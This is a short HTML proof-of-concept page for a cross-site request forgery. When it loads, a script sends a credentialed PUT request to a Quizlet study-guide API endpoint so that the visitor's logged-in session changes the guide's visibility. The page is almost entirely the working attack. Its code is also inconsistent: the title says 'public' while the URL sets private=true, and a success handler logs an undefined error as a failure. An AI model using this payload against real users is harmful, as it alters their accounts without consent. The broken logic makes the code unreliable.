<html>
  <body>
    <h1>CSRF PoC: Make Study Guide Public</h1>
    <script>
      fetch("https://quizlet.com/webapi/3.11/study-guides/42bacad3-83e0-4f6c-aab4-b52be6ffdb2f?private=true", {
        method: "PUT",
        credentials: "include"
      }).then(res => {

        console.error("Request failed:", err);
      });
    </script>
  </body>
</html>
